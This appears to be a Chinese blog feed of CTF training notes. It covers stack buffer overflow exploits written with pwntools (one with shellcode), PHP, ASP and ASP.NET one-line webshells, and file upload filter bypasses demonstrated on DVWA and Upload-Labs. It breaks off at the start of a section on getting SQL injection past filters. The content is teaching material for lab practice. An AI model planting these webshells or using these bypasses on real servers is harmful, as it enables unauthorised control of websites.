寄存器。</3></2></1></li><li>跳转：按照函数返回地址跳回母函数中继续执行。</li></ol><p><img src="/pics/BIN集训/PWN/二/2.png" srcset="/img/loading.gif" alt></p><p>PS：栈的守护天使——GS，也称作 Stack Canary/Cookie</p><h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL 可以化为两部分，即 <code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p><h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET 也可以转化为两部分，即 <code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p><h1 id="缓冲区溢出（Buffer-Overflow）"><a href="#缓冲区溢出（Buffer-Overflow）" class="headerlink" title="缓冲区溢出（Buffer Overflow）"></a>缓冲区溢出（Buffer Overflow）</h1><p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。</p><p>尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</p><h1 id="Linux-下的-Pwn-常用命令"><a href="#Linux-下的-Pwn-常用命令" class="headerlink" title="Linux 下的 Pwn 常用命令"></a>Linux 下的 Pwn 常用命令</h1><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">cd</td><td style="text-align:center">进入文件夹</td></tr><tr><td style="text-align:center">ls</td><td style="text-align:center">列出当前目录下的所有文件</td></tr><tr><td style="text-align:center">mkdir</td><td style="text-align:center">创建文件夹</td></tr><tr><td style="text-align:center">pwd</td><td style="text-align:center">显示当前所在目录</td></tr><tr><td style="text-align:center">chmod</td><td style="text-align:center">改变文件使用权限</td></tr><tr><td style="text-align:center">objdump</td><td style="text-align:center">查看目标文件或者可执行的目标文件的构成</td></tr><tr><td style="text-align:center">gdb</td><td style="text-align:center">使用 gdb 进行调试</td></tr><tr><td style="text-align:center">checksec</td><td style="text-align:center">检测二进制的保护机制是否开启（peda 中的命令）</td></tr></tbody></table><h1 id="Linux-下的-Pwn-常用到的工具"><a href="#Linux-下的-Pwn-常用到的工具" class="headerlink" title="Linux 下的 Pwn 常用到的工具"></a>Linux 下的 Pwn 常用到的工具</h1><ul><li>gdb：Linux 调试中必要用到的</li><li>gdb-peda：gdb 方便调试的工具，类似的工具有 gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">http://blog.csdn.net/gatieme/article/details/63254211</a></li><li>pwntools：写 exp 和 poc 的利器</li><li>checksec：可以很方便的知道 elf 程序的安全性和程序的运行平台</li><li>objdump 和 readelf：可以很快的知道 elf 程序中的关键信息</li><li>ida pro：强大的反编译工具</li><li>ROPgadget：强大的 rop 利用工具</li><li>one_gadget：可以快速的寻找 libc 中的调用 exec(‘bin/sh’)的位置</li><li>libc-database：可以通过泄露的 libc 的某个函数地址查出远程系统是用的哪个 libc 版本</li></ul><h1 id="gdb-基本命令"><a href="#gdb-基本命令" class="headerlink" title="gdb 基本命令"></a>gdb 基本命令</h1><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">start</td><td style="text-align:center">开始调试</td></tr><tr><td style="text-align:center">pattc</td><td style="text-align:center">生成规律字符串</td></tr><tr><td style="text-align:center">patto</td><td style="text-align:center">查找字符串</td></tr><tr><td style="text-align:center">q</td><td style="text-align:center">退出</td></tr><tr><td style="text-align:center">n</td><td style="text-align:center">执行一行源代码但不进入函数内部</td></tr><tr><td style="text-align:center">ni</td><td style="text-align:center">执行一行汇编代码但不进入函数内部</td></tr><tr><td style="text-align:center">s</td><td style="text-align:center">执行一行源代码而且进入函数内部</td></tr><tr><td style="text-align:center">si</td><td style="text-align:center">执行一行汇编代码而且进入函数内部</td></tr><tr><td style="text-align:center">c</td><td style="text-align:center">继续执行到下一个断点</td></tr><tr><td style="text-align:center">b</td><td style="text-align:center">下断点</td></tr><tr><td style="text-align:center">stack</td><td style="text-align:center">显示栈信息</td></tr><tr><td style="text-align:center">x</td><td style="text-align:center">按十六进制格式显示内存数据</td></tr><tr><td style="text-align:center">r</td><td style="text-align:center">运行代码</td></tr></tbody></table><h1 id="Pwntools-基本函数"><a href="#Pwntools-基本函数" class="headerlink" title="Pwntools 基本函数"></a>Pwntools 基本函数</h1><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">process()</td></tr><tr><td style="text-align:center">sendline()</td><td style="text-align:center">向目标发送一行字符串</td></tr><tr><td style="text-align:center">interactive()</td><td style="text-align:center">实现和程序之间的交互</td></tr><tr><td style="text-align:center">remote()</td><td style="text-align:center">远程连接</td></tr><tr><td style="text-align:center">context()</td><td style="text-align:center">设置运行时变量</td></tr><tr><td style="text-align:center">p32()/p64()</td><td style="text-align:center">把整数转化为 32/64 位的字符串</td></tr><tr><td style="text-align:center">u32()/u64()</td><td style="text-align:center">把 32/64 位字符串转化成整数</td></tr><tr><td style="text-align:center">asm()/disasm()</td><td style="text-align:center">快速汇编/反汇编</td></tr><tr><td style="text-align:center">log()</td><td style="text-align:center">输出消息</td></tr></tbody></table><h1 id="Pwn-的小练习"><a href="#Pwn-的小练习" class="headerlink" title="Pwn 的小练习"></a>Pwn 的小练习</h1><p>第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。</p><h2 id="p1"><a href="#p1" class="headerlink" title="p1"></a>p1</h2><p>程序源码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vmd(){    system(&quot;sh&quot;);}void A(){    char a[100];    scanf(&quot;%s&quot;,a);    return;}int main(){    A();}</code></pre><p>输入 <code>gcc p1.c -o p1 -m32</code>，用来编译 32 位的程序。</p><h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用 <code>A()</code> 函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。</p><p>根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为 <code>cmd()</code> 函数的地址，直接跳转到该函数后 getshell。故先通过 <code>objdump</code> 命令寻找到 cmd 函数的地址</p><p><img src="/pics/BIN集训/PWN/二/3.png" srcset="/img/loading.gif" alt></p><p>然后输入 <code>gdb p1</code> 进入 gdb 调试界面。<code>start</code> 开始调试程序。</p><p><img src="/pics/BIN集训/PWN/二/4.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/PWN/二/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/PWN/二/6.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/PWN/二/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/BIN集训/PWN/二/8.png" srcset="/img/loading.gif" alt></p><p>已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至 <code>cmd()</code> 函数处。</p><p>payload 如下：</p><pre><code class="python">from pwn import *payload = &quot;A&quot; * 112 + &quot;\x6b\x84\x04\x08&quot;p = process(&quot;./p1&quot;)p.sendline(payload)p.interactive()</code></pre><h3 id="Ret-slide"><a href="#Ret-slide" class="headerlink" title="Ret_slide"></a><strong>Ret_slide</strong></h3><p>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。</p><p>因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。</p><p>payload：</p><pre><code class="python">from pwn import *payload = &quot;\x08\x04\x84\xa0&quot; * 28 + &quot;\x6b\x84\x04\x08&quot;p = process(&quot;./p1&quot;)p.sendline(payload)p.interactive()</code></pre><h2 id="3-13"><a href="#3-13" class="headerlink" title="3-13"></a>3-13</h2><p>程序源码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A(){    setvbuf(stdout, 0, _IONBF, 0);    srand(time(0) ^ getpid());    char buf[100];    int magic = rand();    gets(buf);    if (atoi(buf) == magic) {        puts(&quot;Okay...&quot;);        system(&quot;sh&quot;);    }}int main(){    A();}</code></pre><p>同样输入 <code>gcc 3-13.c -o 3-13 -m32</code> 来编译。</p><p>调试一开始发现权限不够，通过 <code>chmod +x 3-13</code> 来获得可执行权限。</p><p><img src="/pics/BIN集训/PWN/二/9.png" srcset="/img/loading.gif" alt></p><p>源代码中使用了 <code>gets()</code> 函数，存在缓存区溢出，故第一个想法应该就是通过对变量 <code>buf</code> 操作使其覆盖变量 <code>magic</code> 的值，使两者相同后得到 shell。</p><p><code>buf</code> 被定义为一个占 100 字节的字符串，而 <code>magic</code> 被定义为一个占 4 字节的整型。</p><p><img src="/pics/BIN集训/PWN/二/10.png" srcset="/img/loading.gif" alt></p><p>根据调试过程可以知道，<code>buf</code> 的地址为 0xffffcf68，而 <code>magic</code> 的地址为 0xffffcfcc。<code>buf</code> 的地址比 <code>magic</code> 的地址更低，两者在栈中显然是先压入 <code>magic</code> 再压入 <code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化 <code>buf</code> 的值来覆盖 <code>magic</code> 的值。最简单的方法显然是让两者都等于零。</p><p>根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量 <code>magic</code>。</p><p>故 payload 为：</p><pre><code class="python">from pwn import *p = process(&#39;./3-13&#39;)payload = &#39;\0&#39; * 104p.sendline(payload)p.interactive()</code></pre><p>这里的 <code>\0</code> 也就是 <code>\x00</code>，而如果输入的是字符 <code>0</code>，转为十六进制后为 <code>\x30</code>，将不能满足条件，无法 getshell。</p><p>这题附上梅大佬的 payload，这里可以放 shellcode：</p><pre><code class="python">from pwn import *offset=116r=process(&quot;3-13&quot;)elf=ELF(&quot;3-13&quot;)bss=elf.bss()get=elf.symbols[&#39;gets&#39;]shell=&quot;\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c&quot;payload=&quot;A&quot;*offset+p32(get)+p32(bss)+p32(bss)r.sendline(payload)r.sendline(shell)r.sendline(&#39;/bin/sh&#39;)r.interactive()</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a><br><a href="https://bbs.pediy.com/thread-212691.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-212691.htm</a><br><a href="http://blog.xiyoulinux.org/detail.jsp?id=1965" target="_blank" rel="noopener">http://blog.xiyoulinux.org/detail.jsp?id=1965</a><br><a href="http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html" target="_blank" rel="noopener">http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html</a><br><a href="https://blog.csdn.net/qq_29343201/article/details/51337025" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a><br><a href="http://www.91ri.org/14382.html" target="_blank" rel="noopener">http://www.91ri.org/14382.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门（三）</title>
    <link href="/2018/07/06/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2018/07/06/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>今天学姐主要讲了文件上传漏洞，了解了 Cknife 等工具的使用。</p><a id="more"></a><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力</p><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>根据语言分类，有 PHP、ASP、JSP、ASP.NET 等不同语言下的木马；根据作用分类，有大马和小马。</p><p>PHP 一句话木马：</p><ul><li><code>&lt;?php ehco shell_exec($_GET[&#39;a&#39;]); ?&gt;</code></li><li><code>&lt;?php ehco shell_exec($_POST[&#39;a&#39;]); ?&gt;</code></li><li><code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code></li></ul><p>ASP 一句话木马：</p><ul><li><code>&lt;%eval request(&quot;Cknife&quot;)%&gt;</code></li></ul><p>ASP.NET 一句话木马：</p><ul><li><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;Cknife&quot;],&quot;unsafe&quot;);%&gt;</code></li></ul><h2 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h2><ol><li><code>shell_exec()</code>：通过环境执行命令，并且将完整的输出以字符串的方式返回。</li><li><code>eval()</code>：把字符串作为 PHP 代码执行执行 a 接收到的内容。</li></ol><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><table><thead><tr><th style="text-align:center">介绍</th><th style="text-align:center">内容</th></tr></thead><tbody><tr><td style="text-align:center">语法</td><td style="text-align:center"><code>int phpinfo(void);</code></td></tr><tr><td style="text-align:center">返回值</td><td style="text-align:center">整数</td></tr><tr><td style="text-align:center">函数种类</td><td style="text-align:center">PHP 系统功能</td></tr></tbody></table><p><code>phpinfo()</code> 会泄漏很多敏感的信息。</p><ol><li>绝对路径（<code>_SERVER[&quot;script_FILENAME&quot;]</code>）</li></ol><p>找到 <code>phpinfo()</code> 可以直接找到网站的绝对路径。</p><ol start="2"><li>支持的程序</li></ol><p>可以查看一些特殊的程序服务，诸如 redis、memcache、mysql、SMTP、curl。要是服务器装了 redis 或者 memcache，就可以通过 ssrf 来 getshell。</p><ol start="3"><li>泄漏真实 ip（<code>_SERVER[&quot;SERVER_ADDR&quot;]</code> 或者 <code>SERVER_ADDR</code>）</li></ol><p>得到的 ip 可以直接用来查旁站和 c 段。</p><ol start="4"><li>GOPHER</li></ol><p>如果支持 gopher 也能直接用 ssrf。</p><ol start="5"><li>fastcgi</li></ol><p>查看是否开启 fastcgi 和查看 fastcgi 的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。</p><ol start="6"><li>泄漏缓存文件地址（<code>_FILES[&quot;file1&quot;]</code>）</li></ol><p>向 <code>phpinfo()</code> post 一个 shell 后，可以在 <code>_FILE[&quot;file1&quot;]</code> 中看到上传的临时文件，如果有个 LFI，便可以直接 getshell。</p><ol start="7"><li>一些敏感配置</li></ol><ul><li><code>allow_url_include</code>：远程文件包含</li><li><code>disable_functions</code>：查看金庸函数</li><li><code>open_basedir</code>：读取一些没权限的目录</li></ul><p>还能获取一些环境信息，如 environment 中的 path、log 等。</p><h2 id="Linux-基本命令"><a href="#Linux-基本命令" class="headerlink" title="Linux 基本命令"></a>Linux 基本命令</h2><ul><li>ls：列出当前目录下所有文件</li><li>pwd：查看文件当前目录</li></ul><h1 id="Cknife（菜刀）"><a href="#Cknife（菜刀）" class="headerlink" title="Cknife（菜刀）"></a>Cknife（菜刀）</h1><p>超级强大的网站管理工，分为客户端和代码两部分</p><p>只要将那简短的一句话代码放到网站上去就可以取得网站的权限</p><p>运行环境：安装了 <code>JRE1.7+</code> 环境的所有操作系统</p><p>主要功能：文件管理、虚拟终端、数据库管理</p><h2 id="DVWA-之-File-Upload"><a href="#DVWA-之-File-Upload" class="headerlink" title="DVWA 之 File Upload"></a>DVWA 之 File Upload</h2><p>low level 的测试一下，源码中没有对任何文件格式进行过滤：</p><ol><li>写出一句话木马</li></ol><p>用菜刀连接的一句话木马：</p><pre><code class="php">&lt;?php @eval($_POST[&#39;a&#39;]; ?&gt;</code></pre><p>直接在网页下通过 GET 的一句话木马：</p><pre><code class="php">&lt;?php echo shell_exec($_GET[&#39;a&#39;]); ?&gt;</code></pre><p>在网页下用 hackbar 通过 POST 的一句话木马：</p><pre><code class="php">&lt;?php echo shell_exec($_POST[&#39;a&#39;]); ?&gt;</code></pre><ol start="2"><li>上传一句话木马直接在网页查到文件</li></ol><p><img src="/pics/WEB集训/三/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/三/2.png" srcset="/img/loading.gif" alt></p><ol><li>Cknife 连接</li></ol><p><img src="/pics/WEB集训/三/3.png" srcset="/img/loading.gif" alt></p><p>源码：</p><pre><code class="php"> &lt;?php    if (isset($_POST[&#39;Upload&#39;])) {            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;            //上传路径为../../hackable/uploads/            $target_path = $target_path . basename( $_FILES[&#39;uploaded&#39;][&#39;name&#39;]);            //上传路径加上上传的文件名            if(!move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;], $target_path)) {            //对是否上传成功做出判断，因此所有格式的文件都能上传                echo &#39;&lt;pre&gt;&#39;;                echo &#39;Your image was not uploaded.&#39;;                echo &#39;&lt;/pre&gt;&#39;;              } else {                echo &#39;&lt;pre&gt;&#39;;                echo $target_path . &#39; succesfully uploaded!&#39;;                echo &#39;&lt;/pre&gt;&#39;;            }        }?&gt;</code></pre><h1 id="文件上传漏洞检测"><a href="#文件上传漏洞检测" class="headerlink" title="文件上传漏洞检测"></a>文件上传漏洞检测</h1><ul><li>客户端 javascript 检测：通常在本地检测文件的扩展名</li><li>服务端 MIME 类型检测：通常检测的是 Content-Type 内容</li><li>服务端目录路径检测：通常根 path 参数相关的内容</li><li>服务端文件扩展名检测：通常检测跟文件 extension 相关的内容</li><li>服务端文件内容检测：检测文件内容是否合法或含有恶意代码</li></ul><h2 id="客户端-javascript-检测"><a href="#客户端-javascript-检测" class="headerlink" title="客户端 javascript 检测"></a>客户端 javascript 检测</h2><p>在客户端使用 js 对不合法图片进行检查</p><p>绕过：</p><ul><li>禁用页面 js</li><li>先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名</li></ul><h2 id="服务端检测绕过（MIME-类型检测）"><a href="#服务端检测绕过（MIME-类型检测）" class="headerlink" title="服务端检测绕过（MIME 类型检测）"></a>服务端检测绕过（MIME 类型检测）</h2><p>通过判断 <code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;</code> 来保证上传的文件类型为 gif</p><p>绕过：通过 burp 抓包，将原来的 Content-Type 类型改为符合要求的类型</p><pre><code>Content-Type: application/octet-stream</code></pre><p><code>application/octet-stream</code> 即为 php 文件的文件类型格式</p><h2 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h2><p>上传路径为 <code>/image/20160704</code> 时，可以通过修改为 <code>image/20160704/eval.php%00filename.gif</code></p><p>通过 %00 截断最终导致存储的文件名为 <code>eval.php</code></p><h2 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h2><p>分为黑名单检测和白名单检测</p><h3 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h3><p>接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传</p><p>绕过：</p><ul><li>后缀名大小写绕过，例如：将 Burpsuite 截获的数据包中的文件名 <code>evil.php</code> 改 <code>evil.php</code></li><li>名单列表绕过，尝试使用非黑名单内的后缀名，如 php5，php7 等</li><li>特殊文件名绕过（只适用 windows，将文件名改为 <code>evil.php.</code> 或 <code>evil.php</code>（注意这里有一个空格)。在 windows 下，不允许这样的命名，所以会将.和空格自动去掉）。</li><li>0x00 截断绕过：在上传的时候，当文件系统读到 0x00 时，会认为文件已经结束。例如：<code>1.php%00.jpg</code>，验证扩展名是 <code>.jpg</code>，但写入的时候是 <code>1.php</code> 文件</li></ul><h3 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h3><p>接收上传的文件做扩展名匹配，匹配上的白名单中的扩展名的文件才能上传</p><p>绕过：</p><ul><li>0x00 阶段绕过</li><li>解析漏洞绕过<ul><li>（1）apache 解析文件名是从右到左识别扩展名，如 <code>eval.php.jpg</code>，文件为 php 文件，不能解析 jpg 会向前解析 php</li><li>（2）IIS6.0 目录名包含 <code>.asp、.asa、.cer</code> 的话，则该目录下的所有文件都将按照 asp 解析。</li><li>（3）IIS6.0 不解析;后面的，所以提交 <code>evil.asp;.html</code> 解析为 asp 类型</li><li>（4）Nginx 解析漏洞：将 php 文件换成其他可以通过的文件后缀，访问的时候在后面加上 <code>eval.php.jpg</code>，如 <code>evil.jpg/.php</code>，<code>evil.jpg</code> 会解析为 php 的格式</li></ul></li></ul><h2 id="服务端文件内容检测"><a href="#服务端文件内容检测" class="headerlink" title="服务端文件内容检测"></a>服务端文件内容检测</h2><ul><li>图像类文件内容检测</li><li>文件幻数检测（图片头格式检测）<ul><li>jpg 内容头 value = <code>FF D8 FF E0 00 10 4A 46 49 46</code></li><li>gif 内容头 value = <code>47 49 46 38 39 61</code></li><li>png 内容头 value = <code>89 50 4E 47</code></li></ul></li></ul><p>绕过：在文件头后加上一句话木马就能绕过</p><h1 id="Upload-Labs"><a href="#Upload-Labs" class="headerlink" title="Upload-Labs"></a>Upload-Labs</h1><p>分别对客户端 javascript 检测、服务端 MIME 类型检测、服务端目录路径检测三种不同类型的绕过进行练习。</p><p>这里有个坑。经过潘大佬的测试，上传文件超过了文件大小 <code>php.ini</code> 中即系统设定的大小。<code>php.ini</code> 中的配置原本为 <code>upload_max_filesize = 2M</code>，修改为 <code>upload_max_filesize = 20M</code>。然后就可以上传文件了。</p><h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p>源码：</p><pre><code class="js">function checkFile() {  var file = document.getElementsByName(&quot;upload_file&quot;)[0].value;  if (file == null || file == &quot;&quot;) {    alert(&quot;请选择要上传的文件!&quot;);    return false;  }  //定义允许上传的文件类型  var allow_ext = &quot;.jpg|.png|.gif&quot;;  //提取上传文件的类型  var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));  //判断上传文件类型是否允许上传  if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {    var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;    alert(errMsg);    return false;  }}</code></pre><p>可以知道此处的过滤是通过 javascript 实现的，在开发者工具中禁用 js 就可以上传木马</p><p><img src="/pics/WEB集训/三/4.png" srcset="/img/loading.gif" alt></p><h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>源码：</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists($UPLOAD_ADDR)) {        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) {                $img_path = $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                $is_upload = true;            }        } else {            $msg = &#39;文件类型不正确，请重新上传！&#39;;        }    } else {        $msg = $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>这里对文件 MIME 类型进行了限制，只需要用 burpsuite 抓包后，将 <code>Content-Type</code> 修改为 <code>image/jpeg</code> 或 <code>image/gif</code> 或 <code>image/png</code>，放包后上传成功</p><p><img src="/pics/WEB集训/三/5.png" srcset="/img/loading.gif" alt></p><h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><p>源码：</p><pre><code class="php">$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        }        else{            $msg = &#39;上传失败！&#39;;        }    }    else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>这里由于有 jpg、png、gif 的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过 %00 对后面的后缀名截断</p><p><img src="/pics/WEB集训/三/6.png" srcset="/img/loading.gif" alt></p><h1 id="实验吧之上传绕过"><a href="#实验吧之上传绕过" class="headerlink" title="实验吧之上传绕过"></a>实验吧之上传绕过</h1><p>bypass the upload<br>格式：flag{}<br><a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">解题链接</a></p><h2 id="0x00-截断上传"><a href="#0x00-截断上传" class="headerlink" title="0x00 截断上传"></a>0x00 截断上传</h2><pre><code class="php">&lt;%path=&quot;upfiles/picture/&quot;file=&quot;20180321.jpg&quot;upfilename=path &amp; file &#39;最后的上传地址%&gt;</code></pre><p><code>upfilename</code> 即为最终名字，意思为如果地址为 <code>picture/1.php+</code>，文件名为 <code>1.jpg</code> 则最终上传上去的文件路径为 <code>picture/1.php+1.jpg</code>。0x00 截断的思路即为将+之后的内容忽略掉使上传文件 <code>1.jpg</code> 最终上传到 <code>1.php</code> 中。</p><p>先随便上传一个图片文件，提示需要上传 php 文件。同样上传 php 文件，提示需要上传其他格式文件。</p><p><img src="/pics/WEB集训/三/7.png" srcset="/img/loading.gif" alt></p><p>这里就需要用到 0x00 截断。提交图片后使用 burpsuite 抓包，在 <code>/uploads/</code> 后面加上 <code>1.php+</code>。</p><p><img src="/pics/WEB集训/三/8.png" srcset="/img/loading.gif" alt></p><p>然后在 hex 里把 <code>+</code> 对应的十六进制改为 <code>00</code>。</p><p><img src="/pics/WEB集训/三/9.png" srcset="/img/loading.gif" alt></p><p>修改完成后得到 flag。</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://www.php.cn/php-weizijiaocheng-359309.html" target="_blank" rel="noopener">http://www.php.cn/php-weizijiaocheng-359309.html</a><br><a href="https://blog.csdn.net/zhanghw0917/article/details/46793847" target="_blank" rel="noopener">https://blog.csdn.net/zhanghw0917/article/details/46793847</a><br><a href="https://www.cnblogs.com/bmjoker/p/9141322.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9141322.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门（二）</title>
    <link href="/2018/07/04/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2018/07/04/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。</p><a id="more"></a><h1 id="带过滤的-SQL-注入"><a href="#带过滤的-SQL-注入" class="headerlink" title="带过滤的 SQL 注入"></a>带过滤的 SQL 注入</h1><p>SQL 注入的过程中有些特定的字符或者字符串会被过滤，数据库无法了解正确的查询语句。</p><h1 id="如何绕过过滤"><a href="#如何绕过过滤" class="headerlink" title="如何绕过过滤"></a>如何绕过过滤</h1><h2 id="运用编码技术绕过"><a href="#运用编码技术绕过" class="headerlink" title="运用编码技术绕过"></a>运用编码技术绕过</h2><ol><li>ASCII 码</li></ol><p><code>CHAR(101, 97, 115, 116)</code> 即等价于 <code>east</code></p><ol start="2"><li>URL 编码</li></ol><p><code>0x61646D696E</code> 即等价于 <code>admin</code></p><h2 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h2><p>例如：</p><pre><code>seleselectctadmadminin</code></pre><h2 id="大小写交替"><a href="#大小写交替" class="headerlink" title="大小写交替"></a>大小写交替</h2><p>例如：</p><pre><code>SeLEctUnIOn</code></pre><h2 id="空格的绕过"><a href="#空格的绕过" class="headerlink" title="空格的绕过"></a>空格的绕过</h2><ul><li>用两个空格或者 TAB 